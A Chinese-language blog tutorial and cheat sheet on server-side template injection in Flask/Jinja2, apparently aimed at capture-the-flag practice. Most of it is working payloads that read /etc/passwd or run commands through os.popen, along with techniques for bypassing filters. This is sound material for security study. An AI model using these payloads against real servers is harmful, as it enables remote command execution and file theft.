# SSTI注入篇


# SSTI漏洞成因

ssti服务端模板注入成因为：web应用在使用框架（如python的flask、jinjia2、django；java的freemarker、velocity；php的thinkphp、smarty等）时，由于程序员对代码编写的不规范、不严谨造成模板注入漏洞，攻击者通过恶意注入模板代码影响服务器端模板引擎的行为。



# SSTI中常用魔术方法

- \__class__ 返回一个实例所属的类
- \__mro__ 查看类继承的所有父类，直到object
- \__subclasses__() 获取一个类的子类，返回的是一个列表
- \__bases__ 以元组形式返回一个类直接继承的类
- \__init__ 类实例创建之后调用，对当前对象的实例的初始化
- \__globals\_\_ 使用方式为**函数名**\.\_\_globals__，返回一个当前空间下能使用的模块、方法和变量的字典
- \__getattribute__ 当类被调用时，无条件进入此函数
- \__getattr__ 访问对象中不存在的属性时调用
- \__dict__ 返回所有属性，包括属性、方法等
- \__builtins__ 查看当前所有导入的内建函数



# 攻击思路

- ## 获取基本类

```markdown
__dict__          //返回类中的函数和属性，父类子类互不影响
__base__          //返回类的父类 python3
__mro__           //返回类继承的元组，(寻找父类) python3
__init__          //返回类的初始化方法   
__subclasses__()  //返回类中仍然可用的引用  python3
__globals__       //对包含函数全局变量的字典的引用 python3

对于返回的是类实例的话:
__class__         //返回实例的对象，可以使类实例指向Class，使用上面的魔术方法
```

```markdown
''.__class__.__mro__[-1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
```



- ## 获取基本类后，继续获取基本类的子类

  ```markdown
  object.__subclasses__()
  ```



- ##  找\__init__类

  ```markdown
  ''.__class__.__mro__[2].__subclasses__()[99].__init__



- ## 查看其引用\__builtins__

  ```markdown
  ''.__class__.__mro__[2].__subclasses__()[138].__init__.__globals__['__builtins__']
  ```

  

- ## 寻找keys中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能

```markdown
''.__class__.__mro__[2].__subclasses__()[138].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()
```



# 常用目标函数

```markdown
file、subprocess.Popen、os.popen、exec、eval
```



# 绕过过滤方法

- ## 过滤中括号

  魔术方法\__getitem__可替代中括号

  ```markdown
  当中括号被过滤时，如下将被限制访问:
  {{''.__class__.__base__.__subclasses__()['xx'].['popen']('cat /flag')}}
  
  可用__getitem__替换中括号[]:
  {{''.__class__.__base__.__subclasses__().__getitem__(13).__getitem__('popen')('cat /flag')}}
  ```

  

- ## 过滤下划线

  ```markdown
  原payload被限制:
  {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }}
  
  1.使用attr()绕过，payload:
  {{ () | attr(request.args.a) | attr(request.args.b) | attr(request.args.c) | attr(request.args.d) | attr(request.args.e)()['popen']('cat /flag') | attr('read')() }}
  同时get方法传参?a=__class__&b=__base__&c=__subclasses__&d=__init__&e=__globals__
  
  2.将下划线进行编码绕过，payload:
  {{ ().['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubclasses\x5f\x5f']()[xx]['\x5f\x5finit\x5f\x5f'].['\x5f\x5fglobals\x5f\x5f']['popen']('cat /flag') }}
  ```

  

- ## 过滤点

  ```markdown
  原payload被限制:
  {{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }}
  
  1.使用attr()绕过，payload:
  {{ () | attr('__class__') | attr('__base__') | attr('__subclasses__')() | attr('__getitem__')(xx) | attr('__init__') | attr('__globals__') | attr('__getitem__')('popen')('cat /flag') | attr('read')()}}
  
  2. 使用中括号绕过，payload:
  {{ ()['__class__']['__base__']['__subclasses__']()[xx]['__init__']['__globals__']['popen']('cat /flag')['read']()}}
  ```

  

- ## 过滤大括号

  ~~~markdown
  使用{%%}替代{{}}，payload:
  ```liquid
  {% raw %}{% print(''.__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read()) %}{% endraw %}
  ```
  ~~~

- ## 过滤引号

  ```markdown
  当'被过滤后以下访问将被限制
  {{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }}
  
  1.通过request.args的get传参输入引号内的内容，payload：
  {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[request.args.popen](request.args.cmd).read() }}
  同时get传参?popen=popen&cmd=cat /flag
  
  2.通过request.form的post传参输入引号内的内容，payload：
  {{ ().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.popen](request.form.cmd).read() }}
  同时post传参?popen=popen&cmd=cat /flag
   
  3.使用cookies传参，如request.cookies.k1、request.cookies.k2、k1=popen;k2=cat /flag
  ```

  也可将下划线进行

- ## 过滤数字

  ```markdown
  使用过滤器length绕过
  {% set a='aaa' | lenth %}{{ ().__class__.__base__.__subclasses__()[a]}}
  ```

  

- ## 过滤函数名

  ```markdown
  1.使用拼接绕过，payload:
  {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['pop'+'en']('cat /fl' + 'ag').read() }}
  
  2.16进制编码绕过，payload:
  {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['\x70\x6f\x70\x65\x6e']('cat /flag').read() }}
  
  3.base64编码绕过，payload:
  {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[base64.b64decode('cG9wZW4=').decode()]('cat /fl' + 'ag').read() }}
  ```

  


---

> 作者: Hinoatari  
> URL: https://hinoatari.github.io/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/  

